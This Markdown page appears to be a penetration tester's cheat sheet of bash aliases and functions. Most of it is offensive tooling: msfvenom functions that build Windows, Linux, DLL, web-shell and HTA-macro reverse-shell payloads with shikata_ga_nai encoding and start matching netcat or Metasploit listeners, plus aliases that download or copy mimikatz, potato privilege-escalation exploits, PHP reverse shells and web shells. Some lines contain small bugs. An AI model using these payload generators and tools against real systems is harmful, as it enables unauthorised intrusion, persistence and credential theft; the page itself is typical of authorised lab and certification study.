---
title: Bash Aliases
layout: default
nav_order: 2
parent: Essential Tools

---


# Bash Aliases
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }
1. TOC
{:toc}

---

## Useful aliases for file transfers, HTTP server setup, etc. 


Aliases can be put in ~/.zshrc or ~/.bashrc, and sourced. 

*<mark style="color: red">NOTE: Make sure to run the following after adding your desired alias:</mark>*
```bash
source ~/.zshrc && /bin/zsh
```

**<mark style="color: red">NOTE: All aliases that require a listening port will on default create a listener on port 8000</mark>**

### Portable Servers (SMB, HTTP, etc)
Alias to create portable SMB and HTTP servers

Alias usage: 
```bash
httpserver <PORT>

# Will create a HTTP server on port 80
httpserver 80
```

```bash
# Portable servers 
alias smbserver='/usr/share/doc/python3-impacket/examples/smbserver.py -smb2support MYSHARE .'
function httpserver() { 
    local port="${1:-8000}"
    python3 -m http.server "$port"
}
alias apacheserver='sudo systemctl start apache2'
```

### Tool Grabbing
Aliases for grabbing essential tools like `linpeas.sh`, `winpeasany.bat`, etc. 
```bash
# Tool grabbing 
alias sherlock='wget https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1'

alias powerview='cp /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/powerview.ps1 . && echo "\npowerview.ps1 has been transferred to ${$(pwd)}"'

alias getspn='cp /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/Get-SPN.ps1 . && echo "\nGet-SPN.ps1 has been transferred to ${$(pwd)}"'
alias plink='cp /usr/share/windows-resources/binaries/plink.exe . && echo "\nplink.exe has been transferred to ${$(pwd)}"'
alias winprivescpack='sudo cp /opt/privesc.zip . && echo "\bPrivesc.zip toolpack has been transferred to ${$(pwd)}"'
alias winpeasbat='wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat && echo "\nWinPEAS.bat has been downloaded to ${$(pwd)}"'
alias winpeas='wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe && echo "\nWinPEAS has been downloaded tto ${$(pwd)}"'
alias linpeas='wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh && echo "\nLinPEAS has been downloaded to ${$(pwd)}"'
alias activedirpack='sudo cp /opt/active_directory.zip . && echo "\nActive directory toolpack has been transferred to ${$(pwd)}"'
alias mimi32='cp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe . && echo "\nMimikatz 32 Bit has been transferred to ${$(pwd)}"'
alias mimi64='cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe . && echo "\nMimikatz 64 Bit has been transferred to ${$(pwd)}"'
alias mimi211x86='wget https://github.com/allandev5959/mimikatz-2.1.1/raw/master/Win32/mimikatz.exe'
alias mimi211x64='wget https://github.com/allandev5959/mimikatz-2.1.1/raw/master/x64/mimikatz.exe'
alias nc32='cp /usr/share/windows-resource/binaries/nc.exe . && echo "\nNetcat 32-bit has been transferred to ${$(pwd)}"'
alias nc64='wget https://github.com/int0x33/nc.exe/raw/master/nc64.exe'
alias phprevshell='cp /usr/share/webshells/php/php-reverse-shell.php . && echo "\nPHP-Reverse-Shell.php has been transferred to ${$(pwd)}"'
alias juicypotato='wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe'
alias hotpotato='cp ~/Desktop/tools/potato.exe . && echo "\npotato.exe has been transferred to ${$(pwd)}"'
alias roguepotato='cp ~/Desktop/tools/RoguePotato.exe . && echo "\nRoguePotato.exe has been transferred to ${$(pwd)}"'
alias accesschk='cp ~/Desktop/tools/accesschk.exe . && echo "\nAccesschk.exe has been transferred to ${$(pwd)}"'
alias winpeasany='cp ~/Desktop/tools/winPEASany.exe . && echo "\nwinPEASany.exe has been transferred to ${$(pwd)}"'
alias seatbelt='cp ~/Desktop/tools/seatbelt.exe && echo "\nseatbelt.exe has been transferred to ${$(pwd)}"'
alias fgdump='cp /usr/share/windows-resources/binaries/fgdump/fgdump.exe .'
alias testwebshell='wget https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php'
alias lse='wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh -O lse.sh;chmod 700 lse.sh && echo "\nlse.sh has been downloaded to ${$(pwd)}"'
alias les2='curl https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl > les2.pl; chmod +x les2.pl && echo "\nLinux exploit suggester has been downloaded to ${$(pwd)}"'
alias phprevshellwin='curl https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Reverse%20Shell.php > php-reverse-shell-win.php'
```

### Windows Reverse TCP Shells
Aliases to generate MSF reverse shells

Alias Usage:
```bash
staged32win $HOST_IP $PORT
```

```bash
# Staged and unstaged Windows Shells
function staged32win() {
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p windows/shell/reverse_tcp LHOST=$host LPORT=$port -f exe > shell-x86-staged.exe && echo "\npayload listen on port ${port}"
    nc -nvlp $port
}
function staged64win() {
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p windows/x64/shell/reverse_tcp LHOST=$host LPORT=$port -f exe > shell-x64-staged.exe && echo "\npayload listens on port ${port}"
    nc -nvlp $port
}
function unstaged32win() {
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p windows/shell_reverse_tcp LHOST=$host LPORT=$port -f exe > shell-x86-unstaged.exe && echo "\npayload listens on port ${port}"
    nc -nvlp $port
}
function unstaged64win() { 
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p windows/shell_reverse_tcp LHOST=$host LPORT=$port -f exe > shell-x64-unstaged.exe && echo "\npayload listens on port ${port}"
    nc -nvlp $port
}
```

### Linux Reverse TCP Shells
Aliases to create MSF Linux reverse shells
```bash
# Staged and unstaged Linux Shells
function staged32lin() {
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p linux/x86/shell/reverse_tcp LHOST=$host LPORT=$port -f elf > shell-x86-staged.elf && echo "\npayload listens on port ${port}"
    nc -nvlp $port
}
function staged64lin() {
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p linux/x64/shell/reverse_tcp LHOST=$host LPORT=$port -f elf > shell-x64-staged.elf && echo "\npayload listens on port ${port}"
    nc -nvlp $port
}
function unstaged32lin() {
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p linux/x86/shell_reverse_tcp LHOST=$host LPORT=$port -f elf > shell-x32-unstaged.elf && echo "\npayload listens on port ${port}"
    nc -nvlp $port
}
function unstaged64lin() {
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p linux/x64_shell_reverse_tcp LHOST=$host LPORT=$port -f elf > shell-x64-unstaged.elf && echo "\npayload listens on port ${port}"
    nc -nvlp $port
}
```

### Macro Document Shells
Aliases to create document macros
```bash
# Macro Document shells
function macropayload() { 
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p windows/shell_reverse_tcp LHOST=$host LPORT=$port -f hta-psh -o evil.hta && echo "\npayload listen on port ${port}"
    nc -nvlp $port
}
```

### Metasploit Webshells 
Aliases to create metasploit webshells
```bash
# Metasploit shells - Webshells 
function javashell() { 
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=$host LPORT=$port -f raw > shell.jsp && echo "\npayload listens on port ${port}"
    nc -nvlp $port
}
function warshell() { 
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=$host LPORT=$port -f war > shell.war && echo "\npayload listens on port ${port}"
    nc -nvlp $port
}
function phpshell() { 
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p php/reverse_php LHOST=$host LPORT=$port -f raw > shell.php && echo "\npayload listens on port ${port}"
    nc -nvlp $port
}
function aspshell() {  
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p windows/shell/reverse_tcp LHOST=$host LPORT=$port -f asp > shell.asp && echo "\npayload listens on port ${port}"
    nc -nvlp $port
}
```

### Windows Meterpreter Shells
Aliases to create windows meterpreter shells
```bash
# Meterpreter shells-  Windows 
function meterpreterwin32staged() {
    local host="${1:-tun0}"
    local port="${2:-8000}"    
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$host LPORT=$port -f exe > shell-x86-staged.exe && echo "\npayload listens on port ${port}"
    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST tun0; set LPORT $port; set EnableStageEncoding true;          set StageEncoder x86/shikata_ga_nai; set AutoRunScript post/windows/manage/migrate; exploit"
}
function meterpreterwin32unstaged() { 
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p windows/meterpreter_reverse_tcp LHOST=$host LPORT=$port -f exe > shell-x86-unstaged.exe && echo "\npayload listens on port ${port}"
    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter_reverse_tcp; set LHOST tun0; set LPORT $port; set EnableStageEncoding true;          set StageEncoder x86/shikata_ga_nai; set AutoRunScript post/windows/manage/migrate; exploit"
}

function meterpreterwin64staged() { 
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$host LPORT=$port -f exe > shell-x64-staged.exe && echo "\npayload listens on port ${port}"
    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT $port; set EnableStageEncoding true;      set StageEncoder x86/shikata_ga_nai; set AutoRunScript post/windows/manage/migrate; exploit"
}
function meterpreterwin64unstaged() { 
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$host LPORT=$port -f exe > shell-x64-unstaged.exe && echo "\npayload listens on port ${port}"
    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST tun0; set LPORT $port; set AutoRunScript post/windows/manage/migrate; exploit"
}
```

### Linux Meterpreter Shells
Aliases to create linux meterpreter shells
```bash
# Meterpreter shells - Linux
function meterpreterlin32staged() { 
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$host LPORT=$port -f elf > shell-x86-staged.elf && echo "\npayload listens on port ${port}"
    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST tun0; set LPORT $port; set EnableStageEncoding true;        set StageEncoder x86/shikata_ga_nai;exploit"   
}
function meterpreterlin64staged() {
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$host LPORT=$port -f elf > shell-x64-staged.elf && echo "\npayload listens on port ${port}"
    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT $port; set EnableStageEncoding true;        set StageEncoder x86/shikata_ga_nai;exploit"
}

function meterpreterlin32unstaged() {
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$host LPORT=$port -f elf > shell-x86-unstaged.elf && echo "\npayload listens on port ${port}"
    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter_reverse_tcp; set LHOST tun0; set LPORT $port; set EnableStageEncoding true;        set StageEncoder x86/shikata_ga_nai;exploit"
}
function meterpreterlin64unstaged() {
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=$host LPORT=$port -f elf > shell-x64-unstaged.elf && echo "\npayload listens on port ${port}"
    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter_reverse_tcp; set LHOST tun0; set LPORT $port; set EnableStageEncoding true;        set StageEncoder x86/shikata_ga_nai;exploit"
}
```

### Windows DLL Shells
Aliases to create Windows DLL shells
```bash
# Staged - x64
function dllshellstagedx64() { 
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p windows/x64/shell/reverse_tcp lhost=$host lport=$port -e x86/shikata_ga_nai -f dll > shell.txt && "\nPayload listens on port ${port}. Payload is stored in ${$(pwd)} directory"
    nc -nvlp $port
}

# Staged x86
function dllshellstagedx86() { 
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p windows/x86/shell/reverse_tcp lhost=$host lport=$port -f dll > shell.txt && "\nPayload listens on port ${port}. Payload is stored in ${$(pwd)} directory"
    nc -nvlp $port
}

# Unstaged x64
function dllshellunstagedx64() { 
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p windows/x64/shell_reverse_tcp lhost=$host lport=$port -f dll > shell.txt && "\nPayload listens on port ${port}. Payload is stored in ${$(pwd)} directory"
    nc -nvlp $port
}

# Unstaged x86
function dllshellunstagedx86() { 
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p windows/x86/shell_reverse_tcp lhost=$host lport=$port -f dll > shell.txt && "\nPayload listens on port ${port}. Payload is stored in ${$(pwd)} directory"  
    nc -nvlp $port
}
```

### Compiling C Code
Aliases to compile C code
```bash
function x86compile() { 
     i686-w64-mingw32-gcc $1 -o $2 -lws2_32
}

function x64compile() { 
    i686-w64-mingw32-gcc $1 -o $2
}

function x86compileandrun() { 
    i686-w64-mingw32-gcc $1 -o $2 -lsw2_32 && wine $2
}

function x64compileandrun() { 
    i686-w64-mingw32-gcc $1 -o $2 && wine $2
}
```